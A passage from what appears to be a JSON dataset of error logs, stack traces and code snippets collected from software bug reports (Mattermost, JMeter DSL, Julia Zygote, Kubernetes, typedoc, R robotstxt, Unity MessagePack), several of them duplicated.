demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=1n46idtz47gpupjxmbrr6g8xte Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898539.135249,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898539.702591,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.8073962,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.547894,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.740053,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898542.7785597,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.3239017,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.475797,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=nbg69tj3gfy6icpyoswosou5pa Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}"
    },
    {
        "logs": "[env:d1_mini]\r\nplatform = espressif8266\r\nboard = d1_mini\r\nframework = arduino\r\nbuild_flags = -D NOT_USE_LITTLEFS; this has changed\r\nlib_ldf_mode = chain+"
    },
    {
        "logs": "package com.mechanitis.demo.junit5;\r\n\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.*;\r\n\r\nimport java.io.IOException;\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Collections;\r\nimport java.util.List;\r\nimport java.util.function.Function;\r\nimport java.util.stream.Collectors;\r\n\r\n\r\nimport us.abstracta.jmeter.javadsl.core.testelements.DslSampler;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup.ThreadGroupChild;\r\nimport us.abstracta.jmeter.javadsl.core.configs.DslCsvDataSet;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.InfluxDbBackendListener;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.JtlWriter;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup;\r\nimport us.abstracta.jmeter.javadsl.core.TestPlanStats;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan.TestPlanChild;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.RpsThreadGroup;\r\n\r\n\r\n\r\npublic class TestBuilder {\r\n    protected static class RpsFragmentProfile {\r\n\r\n        private final int rps;\r\n        private final DslSampler sampler;\r\n        private final List<RpsFragmentProfile> children;\r\n    \r\n        protected RpsFragmentProfile(int rps, DslSampler sampler, RpsFragmentProfile... children) {\r\n            this.rps = rps;\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n    \r\n        protected List<ThreadGroupChild> buildTestPlanPartWithBaseRps(int parentRps) {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestPlanPartWithBaseRps(rps).stream())\r\n                .collect(Collectors.toList()));\r\n            if (rps == parentRps) {\r\n                return ret;\r\n            }\r\n            double factor = (double) rps / parentRps;\r\n            ThreadGroupChild[] retArr = ret.toArray(new ThreadGroupChild[0]);\r\n            if (factor > 1) {\r\n                double fraction = factor - Math.floor(factor);\r\n                int loops = (int) Math.ceil(factor);\r\n                if (fraction == 0.0) {\r\n                    return Collections.singletonList(forLoopController(loops,retArr));\r\n                } else {\r\n                    return Collections.singletonList(forLoopController(loops,percentController((float) factor / loops * 100, retArr)));\r\n                }\r\n            } else {\r\n                return Collections.singletonList(percentController((float) factor * 100, retArr));\r\n            }\r\n        }\r\n    }\r\n\r\n    protected static class SimpleFragmentProfile {\r\n\r\n        private final DslSampler sampler;\r\n        private final List<SimpleFragmentProfile> children;\r\n\r\n        protected SimpleFragmentProfile(DslSampler sampler, SimpleFragmentProfile... children) {\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n        protected List<ThreadGroupChild> buildTestSimplePlanPart() {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestSimplePlanPart().stream())\r\n[Truncated]\n        ));\r\n        \r\n    host = \"https:/host.io\";\r\n    TestBuilder.RpsTestPlanProfile RpsThreadGroup = new TestBuilder.RpsTestPlanProfile()\r\n        .add(30, Samplers.ProductSearch.get(host)\r\n            .children(\r\n              jsr223PostProcessor(\"vars.put('PRODUCT_PAYLOAD',props.get('PRODUCTS_PAYLOAD')); System.out.println(props.get('PRODUCTS_PAYLOAD'))\")\r\n            ))\r\n        .add(6, Samplers.ProductDictionary.get(host))\r\n        .add(4, Samplers.ProductBatch.get(host));\r\n    \r\n    \r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"showcase.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(SimpleThreadGroup.SimpleThreadGroupCreate(PerfTestNew::buildSimpleThreadGroup));\r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"products.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(RpsThreadGroup.RpsThreadGroupCreate(PerfTestNew::buildThreadGroup));\r\n    TestBuilder.TestPlanHashMap.saveAsJmx(TestBuilder.TestPlanHashMap.buildTestPlan(), \"test5.jmx\");\r\n  }\r\n}"
    },
    {
        "logs": "package com.mechanitis.demo.junit5;\r\n\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.*;\r\n\r\nimport java.io.IOException;\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Collections;\r\nimport java.util.List;\r\nimport java.util.function.Function;\r\nimport java.util.stream.Collectors;\r\n\r\n\r\nimport us.abstracta.jmeter.javadsl.core.testelements.DslSampler;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup.ThreadGroupChild;\r\nimport us.abstracta.jmeter.javadsl.core.configs.DslCsvDataSet;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.InfluxDbBackendListener;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.JtlWriter;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup;\r\nimport us.abstracta.jmeter.javadsl.core.TestPlanStats;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan.TestPlanChild;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.RpsThreadGroup;\r\n\r\n\r\n\r\npublic class TestBuilder {\r\n    protected static class RpsFragmentProfile {\r\n\r\n        private final int rps;\r\n        private final DslSampler sampler;\r\n        private final List<RpsFragmentProfile> children;\r\n    \r\n        protected RpsFragmentProfile(int rps, DslSampler sampler, RpsFragmentProfile... children) {\r\n            this.rps = rps;\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n    \r\n        protected List<ThreadGroupChild> buildTestPlanPartWithBaseRps(int parentRps) {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestPlanPartWithBaseRps(rps).stream())\r\n                .collect(Collectors.toList()));\r\n            if (rps == parentRps) {\r\n                return ret;\r\n            }\r\n            double factor = (double) rps / parentRps;\r\n            ThreadGroupChild[] retArr = ret.toArray(new ThreadGroupChild[0]);\r\n            if (factor > 1) {\r\n                double fraction = factor - Math.floor(factor);\r\n                int loops = (int) Math.ceil(factor);\r\n                if (fraction == 0.0) {\r\n                    return Collections.singletonList(forLoopController(loops,retArr));\r\n                } else {\r\n                    return Collections.singletonList(forLoopController(loops,percentController((float) factor / loops * 100, retArr)));\r\n                }\r\n            } else {\r\n                return Collections.singletonList(percentController((float) factor * 100, retArr));\r\n            }\r\n        }\r\n    }\r\n\r\n    protected static class SimpleFragmentProfile {\r\n\r\n        private final DslSampler sampler;\r\n        private final List<SimpleFragmentProfile> children;\r\n\r\n        protected SimpleFragmentProfile(DslSampler sampler, SimpleFragmentProfile... children) {\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n        protected List<ThreadGroupChild> buildTestSimplePlanPart() {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestSimplePlanPart().stream())\r\n[Truncated]\n        ));\r\n        \r\n    host = \"https:/host.io\";\r\n    TestBuilder.RpsTestPlanProfile RpsThreadGroup = new TestBuilder.RpsTestPlanProfile()\r\n        .add(30, Samplers.ProductSearch.get(host)\r\n            .children(\r\n              jsr223PostProcessor(\"vars.put('PRODUCT_PAYLOAD',props.get('PRODUCTS_PAYLOAD')); System.out.println(props.get('PRODUCTS_PAYLOAD'))\")\r\n            ))\r\n        .add(6, Samplers.ProductDictionary.get(host))\r\n        .add(4, Samplers.ProductBatch.get(host));\r\n    \r\n    \r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"showcase.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(SimpleThreadGroup.SimpleThreadGroupCreate(PerfTestNew::buildSimpleThreadGroup));\r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"products.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(RpsThreadGroup.RpsThreadGroupCreate(PerfTestNew::buildThreadGroup));\r\n    TestBuilder.TestPlanHashMap.saveAsJmx(TestBuilder.TestPlanHashMap.buildTestPlan(), \"test5.jmx\");\r\n  }\r\n}"
    },
    {
        "logs": "ERROR: LoadError: DimensionMismatch(\"arrays could not be broadcast to a common size; got a dimension with lengths 0 and 11\")\r\nStacktrace:\r\n  [1] _bcs1\r\n    @ .\\broadcast.jl:501 [inlined]\r\n  [2] _bcs(shape::Tuple{Base.OneTo{Int64}, Base.OneTo{Int64}}, newshape::Tuple{Base.OneTo{Int64}, Base.OneTo{Int64}}) (repeats 2 times)\r\n    @ Base.Broadcast .\\broadcast.jl:495\r\n  [3] broadcast_shape\r\n    @ .\\broadcast.jl:489 [inlined]\r\n  [4] combine_axes\r\n    @ .\\broadcast.jl:484 [inlined]\r\n  [5] instantiate\r\n    @ .\\broadcast.jl:266 [inlined]\r\n  [6] materialize\r\n    @ .\\broadcast.jl:883 [inlined]\r\n  [7] adjoint\r\n    @ C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\lib\\broadcast.jl:74 [inlined]\r\n  [8] _pullback\r\n    @ C:\\Users\\Jade\\.julia\\packages\\ZygoteRules\\AIbCs\\src\\adjoint.jl:65 [inlined]\r\n  [9] _pullback\r\n    @ C:\\Users\\Jade\\.julia\\packages\\Transformers\\V363g\\src\\basic\\loss.jl:25 [inlined]\r\n [10] _pullback(::Zygote.Context, ::typeof(logkldivergence), ::Array{Float32, 3}, ::CuArray{Float32, 3, CUDA.Mem.DeviceBuffer})\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface2.jl:0\r\n [11] _pullback\r\n    @ C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:82 [inlined]\r\n [12] _pullback(::Zygote.Context, ::typeof(loss), ::CuArray{Int64, 2, CUDA.Mem.DeviceBuffer}, ::CuArray{Int64, 2, CUDA.Mem.DeviceBuffer})\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface2.jl:0\r\n [13] _pullback\r\n    @ C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:105 [inlined]\r\n [14] _pullback(::Zygote.Context, ::var\"#4#6\")\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface2.jl:0\r\n [15] pullback(f::Function, ps::Zygote.Params)\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface.jl:338\r\n [16] gradient(f::Function, args::Zygote.Params)\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface.jl:75\r\n [17] train!()\r\n    @ Main C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:105\r\n [18] top-level scope\r\n    @ C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:114"
    },
    {
        "logs": "Fri Oct 08 20:08:06 2021 - logError - ERROR - MainThread >\r\n The following error was handled safely by Xi-cam. It is displayed here for debugging.\r\nFri Oct 08 20:08:06 2021 - logError - ERROR - MainThread >\r\n Traceback (most recent call last):\r\n   File \"run_xicam.py\", line 6, in <module>\r\n    from xicam.core.args import parse_args\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\__init__.py\", line 2, in <module>\r\n    from . import formats\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\formats\\__init__.py\", line 1, in <module>\r\n    from . import NPYPlugin\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\formats\\NPYPlugin.py\", line 4, in <module>\r\n    from xicam.plugins.datahandlerplugin import DataHandlerPlugin, start_doc\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\plugins\\__init__.py\", line 25, in <module>\r\n    from .datahandlerplugin import DataHandlerPlugin\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\plugins\\datahandlerplugin.py\", line 5, in <module>\r\n    from xicam.core.data import lazyfield\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\data\\__init__.py\", line 7, in <module>\r\n    from databroker.in_memory import BlueskyInMemoryCatalog\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\databroker\\in_memory.py\", line 3, in <module>\r\n    from .core import Entry, retry\r\n ModuleNotFoundError: No module named 'databroker.core'"
    },
    {
        "logs": "Fri Oct 08 20:08:06 2021 - logError - ERROR - MainThread >\r\n The following error was handled safely by Xi-cam. It is displayed here for debugging.\r\nFri Oct 08 20:08:06 2021 - logError - ERROR - MainThread >\r\n Traceback (most recent call last):\r\n   File \"run_xicam.py\", line 6, in <module>\r\n    from xicam.core.args import parse_args\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\__init__.py\", line 2, in <module>\r\n    from . import formats\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\formats\\__init__.py\", line 1, in <module>\r\n    from . import NPYPlugin\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\formats\\NPYPlugin.py\", line 4, in <module>\r\n    from xicam.plugins.datahandlerplugin import DataHandlerPlugin, start_doc\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\plugins\\__init__.py\", line 25, in <module>\r\n    from .datahandlerplugin import DataHandlerPlugin\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\plugins\\datahandlerplugin.py\", line 5, in <module>\r\n    from xicam.core.data import lazyfield\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\xicam\\core\\data\\__init__.py\", line 7, in <module>\r\n    from databroker.in_memory import BlueskyInMemoryCatalog\r\n   File \"C:\\Users\\linol\\Anaconda3\\envs\\xicam_temp\\lib\\site-packages\\databroker\\in_memory.py\", line 3, in <module>\r\n    from .core import Entry, retry\r\n ModuleNotFoundError: No module named 'databroker.core'"
    },
    {
        "logs": "info :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg\r\nlog  : Failed to download package from 'https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg'.\r\nThe HTTP request to 'GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg' has timed out.\r\ninfo :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg"
    },
    {
        "logs": "info :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg\r\nlog  : Failed to download package from 'https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg'.\r\nThe HTTP request to 'GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg' has timed out.\r\ninfo :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg"
    },
    {
        "logs": "I0207 04:04:21.578006    3515 kubelet.go:2316] SyncLoop (ADD, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\"\r\nW0207 04:04:21.578865    3515 manager.go:173] Container readiness changed for unknown container: \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" - \"://\"\r\nI0207 04:04:21.591854    3515 manager.go:1551] Need to restart pod infra container for \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" because it is not found\r\nI0207 04:04:22.149903    3515 kubelet.go:2338] SyncLoop (PLEG): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\", event: &pleg.PodLifecycleEvent{ID:\"de019055-cd4f-11e5-98b0-42010af00007\", Type:\"ContainerStarted\", Data:\"5fca6b5e43a03a31739abd73841af77e61ba687a16368418871ff178a13d8057\"}\r\nI0207 04:06:25.161553    3515 kubelet.go:2322] SyncLoop (REMOVE, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\""
    },
    {
        "logs": "I0207 04:04:21.578006    3515 kubelet.go:2316] SyncLoop (ADD, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\"\r\nW0207 04:04:21.578865    3515 manager.go:173] Container readiness changed for unknown container: \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" - \"://\"\r\nI0207 04:04:21.591854    3515 manager.go:1551] Need to restart pod infra container for \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" because it is not found\r\nI0207 04:04:22.149903    3515 kubelet.go:2338] SyncLoop (PLEG): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\", event: &pleg.PodLifecycleEvent{ID:\"de019055-cd4f-11e5-98b0-42010af00007\", Type:\"ContainerStarted\", Data:\"5fca6b5e43a03a31739abd73841af77e61ba687a16368418871ff178a13d8057\"}\r\nI0207 04:06:25.161553    3515 kubelet.go:2322] SyncLoop (REMOVE, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\""
    },
    {
        "logs": "USS-Kelvin [devtools-author] (issue-#19/install-sinon-chrome) $ karma start\r\n09 02 2016 16:23:39.140:WARN [karma]: No captured browser, open http://localhost:9876/\r\n09 02 2016 16:23:39.157:INFO [karma]: Karma v0.13.19 server started at http://localhost:9876/\r\n09 02 2016 16:23:39.167:INFO [launcher]: Starting browser Chrome\r\n09 02 2016 16:23:41.007:INFO [Chrome 48.0.2564 (Mac OS X 10.11.3)]: Connected on socket /#VLUutoLJWC3ulCwKAAAA with id 78999512\r\nChrome 48.0.2564 (Mac OS X 10.11.3) ERROR\r\n  Uncaught TypeError: Cannot read property 'panels' of undefined\r\n  at /Users/username_0/Engineering/devtools-author/app/scripts/devtools.js:9\r\n\r\n09 02 2016 16:23:41.411:WARN [web-server]: 404: /dist/scripts/themes.json"
    },
    {
        "logs": "/Project/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43\r\n        Marked.setOptions({\r\n               ^\r\n\r\nTypeError: Marked.setOptions is not a function\r\n    at MarkedPlugin.initialize (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43:16)\r\n    at MarkedPlugin.AbstractComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:87:15)\r\n    at MarkedPlugin.RendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:21:42)\r\n    at MarkedPlugin.ContextAwareRendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:29:47)\r\n    at new MarkedPlugin (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:31:47)\r\n    at Renderer.ChildableComponent.addComponent /Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at Renderer.ChildableComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:133:19)\r\n    at new Renderer (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/renderer.js:31:42)\r\n    at CliApplication.ChildableComponent.addComponent (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at CliApplication.Application [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/application.js:38:32)"
    },
    {
        "logs": "Error: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3462)\r\n Declaration or statement expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ']' expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ')' expected."
    },
    {
        "logs": "/Project/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43\r\n        Marked.setOptions({\r\n               ^\r\n\r\nTypeError: Marked.setOptions is not a function\r\n    at MarkedPlugin.initialize (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43:16)\r\n    at MarkedPlugin.AbstractComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:87:15)\r\n    at MarkedPlugin.RendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:21:42)\r\n    at MarkedPlugin.ContextAwareRendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:29:47)\r\n    at new MarkedPlugin (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:31:47)\r\n    at Renderer.ChildableComponent.addComponent /Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at Renderer.ChildableComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:133:19)\r\n    at new Renderer (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/renderer.js:31:42)\r\n    at CliApplication.ChildableComponent.addComponent (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at CliApplication.Application [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/application.js:38:32)"
    },
    {
        "logs": "Error: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3462)\r\n Declaration or statement expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ']' expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ')' expected."
    },
    {
        "logs": ".\r\n.\r\n.\r\n2018-04-23T11:11:07.409Z\tDEBUG\tsentinel/sentinel.go:152\tsentinelInfo dump\t{\"sentinelInfo\": {\"UID\":\"95fc1b83\"}}\r\n2018-04-23T11:11:07.429Z\tDEBUG\tsentinel/sentinel.go:1629\tkeepersInfo dump: (cluster.KeepersInfo) (len=2) {\r\n.\r\n.\r\n.\r\n2018-04-23T11:11:11.267Z\tINFO\tsentinel/sentinel.go:107\tTrying to acquire sentinels leadership\r\n2018-04-23T11:11:11.367Z\tERROR\tsentinel/sentinel.go:127\telection loop error\t{\"error\": \"102: Not a file (/stolon/cluster/kube-stolon/sentinel-leader) [9079]\"}\r\n2018-04-23T11:11:12.445Z\tDEBUG\tsentinel/sentinel.go:1599\tcd dump: (*cluster.ClusterData)(0xc420413bc0)({\r\n.\r\n.\r\n.\r\n2018-04-23T11:11:12.445Z\tDEBUG\tsentinel/sentinel.go:152\tsentinelInfo dump\t{\"sentinelInfo\": {\"UID\":\"95fc1b83\"}}\r\n2018-04-23T11:11:12.482Z\tDEBUG\tsentinel/sentinel.go:1629\tkeepersInfo dump: (cluster.KeepersInfo) (len=2) {\r\n.\r\n.\r\n."
    },
    {
        "logs": "ptf> use crackmapexec\r\n[!] [!] DANGER WILL ROBINSON. DANGER WILL ROBINSON. Error has occurred.\r\n[!] [!] It's not possible its due to my coding skillz, it must be you? :-)\r\n[!] [!] Printing that error. Get that error. You get it: module not found"
    },
    {
        "logs": "ptf> use crackmapexec\r\n[!] [!] DANGER WILL ROBINSON. DANGER WILL ROBINSON. Error has occurred.\r\n[!] [!] It's not possible its due to my coding skillz, it must be you? :-)\r\n[!] [!] Printing that error. Get that error. You get it: module not found"
    },
    {
        "logs": " r\r\nlibrary(robotstxt)\r\n\r\n# doesn't work\r\npaths_allowed(\"https://www.google.com\")\r\n#> www.google.com\r\n#> Error in if (is_http) {: argument is of length zero\r\n\r\n# works\r\npaths_allowed(\"https://google.com\")\r\n#>  google.com                      No encoding supplied: defaulting to UTF-8.\r\n#> [1] TRUE"
    },
    {
        "logs": " r\r\nlibrary(robotstxt)\r\n\r\n# doesn't work\r\npaths_allowed(\"https://www.google.com\")\r\n#> www.google.com\r\n#> Error in if (is_http) {: argument is of length zero\r\n\r\n# works\r\npaths_allowed(\"https://google.com\")\r\n#>  google.com                      No encoding supplied: defaulting to UTF-8.\r\n#> [1] TRUE"
    },
    {
        "logs": " r\r\nlibrary(robotstxt)\r\npackageVersion(\"robotstxt\")\r\n#> [1] '0.7.2'\r\n\r\n# works, but warning\r\npaths_allowed(\"https://www.google.com\")\r\n#>  www.google.com\r\n#> Warning in FUN(X[[i]], ...): partial argument match of 'x' to 'xp'\r\n#> [1] TRUE\r\n\r\n# also works, but also warning\r\npaths_allowed(\"https://google.com\")\r\n#>  google.com\r\n#> Warning in FUN(X[[i]], ...): partial argument match of 'x' to 'xp'\r\n#> [1] TRUE"
    },
    {
        "logs": "using UnityEngine;\r\nusing MessagePack;\r\nusing MessagePack.Resolvers;\r\n\r\npublic class Test : MonoBehaviour\r\n{\r\n    void Start()\r\n    {\r\n        var data1 = new TestDataWithField();\r\n        MessagePackSerializer.Serialize(data1);\r\n        MessagePackSerializer.Serialize(data1, StandardResolverAllowPrivate.Options);\r\n\r\n        var data2 = new TestDataWithNoField();\r\n        MessagePackSerializer.Serialize(data2);\r\n        MessagePackSerializer.Serialize(data2, StandardResolverAllowPrivate.Options);   // <-Unity application crashes\r\n    }\r\n\r\n    [MessagePackObject]\r\n    public class TestDataWithField\r\n    {\r\n        [Key(0)]\r\n        public int Dummy;\r\n    }\r\n\r\n    [MessagePackObject]\r\n    public class TestDataWithNoField\r\n    {\r\n    }\r\n}"
    },
    {
